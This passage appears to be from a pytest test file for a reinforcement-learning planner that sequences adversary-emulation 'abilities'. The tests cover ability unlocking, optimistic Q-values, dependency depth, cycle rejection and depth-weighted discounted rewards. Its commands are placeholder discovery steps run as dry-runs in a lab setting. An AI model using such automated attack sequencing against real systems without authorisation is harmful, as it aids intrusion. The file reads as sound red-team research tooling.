    offered = set(coordinator._candidates())
    assert planned < offered
    # Everything runnable is on the table, not just the three that were planned.
    assert offered == {a.id for a in catalog.all() if not a.requires}
    # The planner still has its say: its suggestions are ranked first, and
    # equal values are broken by candidate order.
    assert coordinator._candidates()[: len(planned)] == coordinator._plan.ability_ids


def test_an_unlocked_ability_is_offered_even_though_no_plan_named_it(
    catalog: AbilityCatalog,
) -> None:
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=4)
    coordinator.start()
    assert "inspect-process-status" not in coordinator._plan.ability_ids
    coordinator.record_result(
        ExecutionResult(
            "collect-process-list", "succeeded", "UID PID\nnobody 5 0 x\n", "", 0, "dry-run", 0.1
        )
    )
    assert "inspect-process-status" in coordinator._candidates()


def test_the_future_term_only_counts_actions_that_are_reachable(
    catalog: AbilityCatalog,
) -> None:
    """Unlocking changes which actions exist. A max over the whole catalog
    values a state that opened three abilities exactly like one that opened
    none, so the value function could not represent opening options."""
    policy = QPolicy(catalog, optimism=0.0)
    reachable, unreachable = catalog.ids()[0], catalog.ids()[1]
    policy.q[("next", unreachable)] = 10.0
    policy.q[("next", reachable)] = 1.0

    policy.update("s", reachable, 0.0, "next", (reachable,))
    narrow = policy.q[("s", reachable)]
    policy.q.pop(("s", reachable))
    policy.update("s", reachable, 0.0, "next", (reachable, unreachable))
    assert policy.q[("s", reachable)] > narrow


def test_an_untried_action_outranks_one_measured_to_be_worse(
    catalog: AbilityCatalog,
) -> None:
    """Every reward here is positive, so a table starting at zero makes an
    untried action look strictly worse than one already tried and the first
    tie-break would be confirmed forever."""
    tried, untried = catalog.ids()[0], catalog.ids()[1]
    policy = QPolicy(catalog, epsilon=0.0, optimism=2.0)
    policy.q[("s", tried)] = 1.0
    assert policy.choose("s", (tried, untried)) == untried
    # Once measured as better, it wins on its own merit rather than on novelty.
    policy.q[("s", tried)] = 3.0
    assert policy.choose("s", (tried, untried)) == tried


def test_optimism_survives_a_round_trip(catalog: AbilityCatalog, tmp_path: Path) -> None:
    # Saved tables hold measured pairs only, so an absent pair must still read
    # back as unmeasured rather than as a measured zero.
    path = tmp_path / "q.json"
    policy = QPolicy(catalog, optimism=2.0)
    policy.q[("s", catalog.ids()[0])] = 1.0
    policy.save(path)
    restored = QPolicy(catalog, optimism=2.0)
    assert restored.load(path) is True
    assert restored.value("s", catalog.ids()[1]) == 2.0


def test_depth_is_the_shallowest_chain_that_reaches_an_ability(
    catalog: AbilityCatalog,
) -> None:
    for ability in catalog.all():
        assert catalog.depth(ability.id) == (1 if ability.requires else 0)


def test_depth_counts_a_longer_chain(tmp_path: Path) -> None:
    catalog = _catalog_from(
        {
            "traits": {"host.process.pid": "^[0-9]{1,7}$", "deep": "^[a-z]+$"},
            "abilities": [
                _producer(),
                _minimal(produces=[{"trait": "deep", "pattern": "(?m)^([a-z]+)$"}]),
                {
                    "id": "deeper",
                    "name": "Deeper",
                    "tactic": "discovery",
                    "technique": "T0003",
                    "command": ["cat", "{deep}"],
                    "description": "d",
                    "requires": ["deep"],
                },
            ],
        },
        tmp_path,
    )
    assert catalog.depth("lister") == 0
    assert catalog.depth("probe") == 1
    assert catalog.depth("deeper") == 2


def test_a_dependency_cycle_is_refused_at_load(tmp_path: Path) -> None:
    """Abilities in a cycle can never run: each waits for a trait only the
    other supplies. Nothing at runtime would report that."""
    with pytest.raises(ValueError, match="cycle"):
        _catalog_from(
            {
                "traits": {"a": "^[a-z]+$", "b": "^[a-z]+$"},
                "abilities": [
                    {
                        "id": "first",
                        "name": "First",
                        "tactic": "discovery",
                        "technique": "T1",
                        "command": ["cat", "{b}"],
                        "description": "d",
                        "requires": ["b"],
                        "produces": [{"trait": "a", "pattern": "^([a-z]+)$"}],
                    },
                    {
                        "id": "second",
                        "name": "Second",
                        "tactic": "discovery",
                        "technique": "T2",
                        "command": ["cat", "{a}"],
                        "description": "d",
                        "requires": ["a"],
                        "produces": [{"trait": "b", "pattern": "^([a-z]+)$"}],
                    },
                ],
            },
            tmp_path,
        )


def test_a_deeper_finding_is_worth_more_than_a_surface_one() -> None:
    """Without this the reward is a function of the set executed, so under
    discounting every feasible order pays exactly the same."""
    model = RewardModel()
    policy = LabPolicy()
    surface = model.score(_result("alpha\n"), policy, depth=0)
    model.reset()
    deep = model.score(_result("alpha\n"), policy, depth=1)
    assert deep.total > surface.total
    assert deep.depth_reward == 0.5
    assert surface.depth_reward == 0.0
    assert deep.discovery_depth == 1


def test_depth_pays_nothing_for_a_failure() -> None:
    breakdown = RewardModel().score(_result("", status="failed"), LabPolicy(), depth=2)
    assert breakdown.depth_reward == 0.0


def test_the_reward_records_the_depth_it_paid_for(catalog: AbilityCatalog) -> None:
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=len(catalog.ids()))
    coordinator.start()
    coordinator.record_result(
        ExecutionResult(
            "collect-process-list", "succeeded", "UID PID\nnobody 3 0 x\n", "", 0, "dry-run", 0.1
        )
    )
    coordinator.record_result(
        ExecutionResult("inspect-process-status", "succeeded", "Name: cat\n", "", 0, "dry-run", 0.1)
    )
    scored = {
        event.details["ability_id"]: event.details
        for event in coordinator.events
        if event.event == "reward.scored"
    }
    assert scored["collect-process-list"]["discovery_depth"] == 0
    assert scored["inspect-process-status"]["discovery_depth"] == 1
    assert scored["inspect-process-status"]["depth_reward"] > 0


def _discounted(order: list[tuple[str, int]], gamma: float = 0.85) -> float:
    """Discounted return of one ordering, scored as a run would score it."""
    model = RewardModel()
    policy = LabPolicy()
    total = 0.0
    for step, (ability_id, depth) in enumerate(order):
        breakdown = model.score(
            ExecutionResult(ability_id, "succeeded", f"{ability_id} line\n", "", 0, "dry-run", 0.0),
            policy,
            depth=depth,
        )
        total += gamma**step * breakdown.total
    return total


def test_harvesting_a_discovery_early_is_worth_more_than_deferring_it() -> None:
    """This is the property that makes ordering learnable at all.

    Total reward is a function of the set executed, so a full sweep pays the
    same whatever the order. Discounting is what separates orders, and only
    once abilities differ in value -- which is what depth provides.
    """
    surface = ("collect-surface", 0)
    producer = ("collect-producer", 0)
    gated = ("inspect-gated", 1)

    early = _discounted([producer, gated, surface])
    late = _discounted([surface, producer, gated])
    assert early > late

    # Without a depth reward the same two orders are worth exactly the same,
    # which is the state this replaced.
    flat_early = _discounted([producer, ("inspect-gated", 0), surface])
    flat_late = _discounted([surface, producer, ("inspect-gated", 0)])
    assert flat_early == pytest.approx(flat_late)


def test_a_full_sweep_pays_the_same_total_whatever_the_order() -> None:
    """The reward stays a set function; only the discounting makes order
    matter. Recorded so a change that breaks it is deliberate."""
    order = [("a", 0), ("b", 0), ("c", 1)]
    forward = sum(
        RewardModel().score(
            ExecutionResult(i, "succeeded", f"{i} line\n", "", 0, "dry-run", 0.0),
            LabPolicy(),
            depth=d,
        ).total
        for i, d in order
    )
    backward = sum(
        RewardModel().score(
            ExecutionResult(i, "succeeded", f"{i} line\n", "", 0, "dry-run", 0.0),
            LabPolicy(),
            depth=d,
        ).total
        for i, d in reversed(order)
    )
    assert forward == pytest.approx(backward)
